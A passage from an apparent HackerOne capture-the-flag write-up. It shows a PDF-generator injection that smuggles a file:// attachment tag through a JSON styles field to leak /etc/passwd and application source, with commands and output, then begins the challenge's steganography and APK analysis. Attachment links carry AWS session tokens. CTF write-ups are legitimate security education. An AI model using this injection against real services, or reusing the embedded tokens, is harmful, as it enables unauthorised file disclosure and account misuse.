Spent    Left  Speed\n100 19735  100 19735    0     0  44649      0 --:--:-- --:--:-- --:--:-- 44649\n```\n\nThe attachment won't be visible directly in the document and since my PDF viewer didn't support extraction of attachments, I used `pdftk` to extract the attachments.\n\n```\nroot@pwnbox16:~/files/pdfhack# pdftk out.pdf unpack_files\n\nroot@pwnbox16:~/files/pdfhack# ls -l\ntotal 24\n-rw-rw-r-- 1 root root 19735 Mar  3 08:40 out.pdf\n-rw-r--r-- 1 root root  1020 Mar  3 08:43 passwd\n\nroot@pwnbox16:~/files/pdfhack# cat passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\nnginx:x:101:102:nginx user,,,:/nonexistent:/bin/false\nmessagebus:x:102:103::/var/run/dbus:/bin/false\n```\n\nLooks like we have a full LFD :)\n\nLet's try leaking the source code of webapp. Judging from the previous docker instance, the source should be in `/app/main.py`\n\n```\nroot@pwnbox16:~/files/pdfhack# curl -g --proxy socks5h://localhost:6666 'http://172.19.0.3/invoices/pdfize?d={\"companyName\":\"Acme Tools\",\"email\":\"accounting@acme.com\",\"invoiceNumber\":\"0001\",\"date\":\"2019-04-01\",\"items\":[[\"1\",\"\",\"\",\"10\"]],\"styles\":{\"body\":{\"background-color:white}\u003c/sty\u003c/stystylele\u003ele\u003e\u003clink rel=\\\"attachment\\\" href=\\\"file:///app/main.py\\\"\u003e\":\"white\"}}}'  -o out2.pdf\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 20846  100 20846    0     0  46844      0 --:--:-- --:--:-- --:--:-- 46739\n\nroot@pwnbox16:~/files/pdfhack# pdftk out2.pdf unpack_files\nroot@pwnbox16:~/files/pdfhack# cat main.py\n\"\"\"\nCONGRATULATIONS!\n\nIf you're reading this, you've made it to the end of the road for this CTF.\n\nGo to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.\nMake sure to include 'c8889970d9fb722066f31e804e351993' in the report, so we know for sure you made it through!\n\nCongratulations again, and I'm sorry for the red herrings. :)\n\"\"\"\n\nfrom flask import Flask, abort, redirect, render_template, request, Response\nfrom jinja2 import Template\nfrom weasyprint import HTML\nimport base64, json, os, random, re\n\napp = Flask(__name__)\n\u003csnip\u003e...\n```\n\nLooking at the rest of the source, I realized I dodged a fuckin bulldozer by not messing with the login...\n\n```python\n@app.route('/auth', methods=['GET', 'POST'])\ndef auth(page=None):\n\terror = None\n\tif request.method == 'POST':\n\t\tpassword = request.form['password']\n\t\terror = makeSqlError(password)\n\t\tif error is False or (\"'\" in password and 'sqlmap' in request.headers.get('User-Agent') and random.randrange(3) != 0):\n\t\t\traise Exception('SQL Error')\n\treturn render('login', page=page or 'login', error=error)\n\ndef makeSqlError(password):\n\tpassword = \"'\" + password + \"'\"\n\tquotes = 0\n\tescape = False\n\tnonquoted = ''\n\tfor c in password:\n\t\tif escape:\n\t\t\tescape = False\n\t\telif c == '\\\\':\n\t\t\tescape = True\n\t\telif c == '\\'':\n\t\t\tquotes += 1\n\t\telif (quotes \u0026 1) == 0:\n\t\t\tnonquoted += c\n\n\tif (quotes \u0026 1) != 0:\n\t\treturn False\n\telif ' OR ' in nonquoted:\n\t\treturn 'Invalid password'\n\telif 'UNION' in nonquoted:\n\t\treturn 'Invalid username'\n\treturn 'Invalid username or password\n```\n\nTHAT IS SO EVIL. I definitely wouldn't have enjoyed going down that rabbit hole...\n\nSo getting the source of `main.py` marked the end of the CTF. The flag is `c8889970d9fb722066f31e804e351993`\n\nOverall, it was pretty good except the advanced guessing parts. This was a team effort by me and @corb3nik.\n\n## Impact\n\nCyber quantum blockchain RCE with AI","vulnerability_information_html":"\u003cp\u003eSo the CTF starts with \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FHacker0x01%2Fstatus%2F1100543680383832065\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ethis\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e tweet. \u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"s1.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/370/52a22ae26315968b5f59c54f462606054f834b83/s1.png?response-content-disposition=attachment%3B%20filename%3D%22s1.png%22%3B%20filename%2A%3DUTF-8%27%27s1.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061020Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=8e89456aff528901cd891ade713aa15ed211f5d6ded14ce6905b71ab26247b6b\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/370/52a22ae26315968b5f59c54f462606054f834b83/s1.png?response-content-disposition=attachment%3B%20filename%3D%22s1.png%22%3B%20filename%2A%3DUTF-8%27%27s1.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061020Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=8e89456aff528901cd891ade713aa15ed211f5d6ded14ce6905b71ab26247b6b\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe first image is about the 50 million in bounties but the second one looks related to the CTF. The first thing that comes to mind when relating CTFs and images is \u0026quot;steganography\u0026quot;. \u003c/p\u003e\n\n\u003cp\u003eUsing the all purpose steg tool \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fzed-0xff%2Fzsteg\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ezsteg\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e as our first resort, we discover some interesting data in the image, hidden in the form of LSB steg. It can be isolated like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@pwnbox16:~/files# zsteg --lsb -b 1 -o yx D0XoThpW0AE2r8S.png\nb1,rgb,lsb,yx       .. zlib: data=\u0026quot;https://bit.do/h1therm\u0026quot;, offset=5, size=22\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe shortened URL returns a \u003ca href=\"/redirect?url=https%3A%2F%2Fdrive.google.com%2Ffile%2Fd%2F1u5Mg1xKJMrW4DMGaWtBZ1TJKPdvqCWdJ%2Fview\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eapk\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Instead of installing it, I decided to go with static analysis.\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eAn apk is basically java compiled into bytecode, so it\u0026#39;s easily decompilable. At first, I tried \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fskylot%2Fjadx\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ejadx\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e but it was error-ing out on multiple functions, so I decided to take long way.\u003c/p\u003e\n\n\u003cp\u003eI created a jar file out of the apk using \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FStoryyeller%2Fenjarify\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eenjarify\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and then decompiled it with \u003ca href=\"/redirect?url=https%3A%2F%2Fbitbucket.org%2Fmstrobel%2Fprocyon\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eprocyon\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Along with that, I also disassembled it with apktool to get the other files such as the manifest and resources.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@pwnbox16:~/files# enjarify/enjarify.sh h1thermostat.apk \nUsing python3 as Python interpreter\n1000 classes processed\n2000 classes processed\nOutput written to h1thermostat-enjarify.jar\n2421 classes translated successfully, 0 classes had errors\n\nroot@pwnbox16:~/files# apktool d h1thermostat.apk \nI: Using Apktool 2.3.4 on h1thermostat.apk\nI: Loading resource table...\nI: Decoding AndroidManifest.xml with resources...\nS: WARNING: Could not write to (/root/.local/share/apktool/framework), using /tmp instead...\nS: Please be aware this is a volatile directory and frameworks could go missing, please utilize --frame-path if the default storage directory is unavailable\nI: Loading resource table from file: /tmp/1.apk\nI: Regular manifest package...\nI: Decoding file-resources...\nI: Decoding values */* XMLs...\nI: Baksmaling classes.dex...\nI: Copying assets and libs...\nI: Copying unknown files...\nI: Copying original files...\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eDue to some Java dependency issues locally, I opted to use the online version of procyon availabe at \u003ca title=\"http://www.javadecompilers.com/\" href=\"/redirect?url=http%3A%2F%2Fwww.javadecompilers.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.javadecompilers.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eAfter getting the source and other resources/manifest, I popped it all in Android Studio. \u003c/p\u003e\n\n\u003cp\u003eSkimming over the source, the app looks like a remote controller for a thermostat. \u003c/p\u003e\n\n\u003cp\u003eAccording to the \u003ccode\u003eAndroidManifest.xml\u003c/code\u003e, the MainActivity was \u003ccode\u003ecom.hackerone.thermostat.LoginActivity\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Selection_200.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/392/038135f9aecbeaf6528a2cfe3bd35ce13f9a7d6c/Selection_200.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_200.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_200.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061020Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=b8550988c620bf9dc40b46bc8a1a16fa6684e1479329b1783f7a162392c0d509\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/392/038135f9aecbeaf6528a2cfe3bd35ce13f9a7d6c/Selection_200.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_200.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_200.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061020Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=b8550988c620bf9dc40b46bc8a1a16fa6684e1479329b1783f7a162392c0d509\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eLooking over \u003ccode\u003eLoginActivity\u003c/code\u003e, we identify some interesting functions such as \u003ccode\u003eattemptLogin()\u003c/code\u003e. \u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Selection_201.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/393/8cef772df6a7392eeefbe579ed73c7f55adc4c62/Selection_201.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_201.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_201.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=8f2ccdfccd0910e55c9ad79bd0dacc4a68203270a0332e96cf957eebf462b1f1\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/393/8cef772df6a7392eeefbe579ed73c7f55adc4c62/Selection_201.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_201.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_201.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=8f2ccdfccd0910e55c9ad79bd0dacc4a68203270a0332e96cf957eebf462b1f1\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe main part happens right at the end.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e            \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eshowProgress\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003ejsonObject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ejsonObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan 